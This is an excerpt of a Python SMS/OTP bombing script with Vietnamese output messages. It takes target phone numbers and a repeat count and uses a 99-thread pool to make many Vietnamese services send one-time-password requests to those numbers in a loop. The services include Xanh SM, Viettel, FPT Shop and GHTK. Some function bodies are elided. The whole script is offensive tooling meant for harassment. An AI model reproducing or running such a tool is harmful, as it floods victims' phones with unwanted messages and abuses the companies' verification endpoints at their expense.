...
args = sys.argv[1:]
if len(args) < 2:
    print("Cách dùng: python vip.py <sđt1> <sđt2> ... <lần lặp>")
    sys.exit()
count = int(args[-1])
phone_numbers = [sdtt(sdt) for sdt in args[:-1]]
...
def xanhsmzl2(sdt):
    ...
    try:
        ...
        print("XANHSM2 | TRẠNG THÁI : " + Fore.RED +
              "THẤT BẠI" + Style.RESET_ALL)
...
def xanhsmzl(sdt):
    ...
    response = requests.post(
        'https://gapi.xanhsm.com/bike/registering/create-registration', headers=headers, json=json_data)
    url = "https://api.gsm-api.net/auth/v1/public/otp/send"
...
functions = [
    tv360, xanhsmzl, xanhsmzl2, vieon, myviettel, fptshop, befood, foodhubzl,
    vttelecom, vinwonders, hasaki, fahasa,
    mocha, liena, viettelpost, ghtk, vuihoc,
...
def run_services_for_phone(sdt):
    for func in functions:
        try:
            func(sdt)
        except Exception as e:
            print(f"{func.__name__} lỗi với số {sdt}: {e}")
        time.sleep(0.1)

def main():
    print(f"Bắt đầu gửi OTP cho {len(phone_numbers)} số điện thoại, mỗi số {count} lần")
    with concurrent.futures.ThreadPoolExecutor(max_workers=99) as executor:
        for _ in range(count):
            for sdt in phone_numbers:
                executor.submit(run_services_for_phone, sdt)
            time.sleep(1)
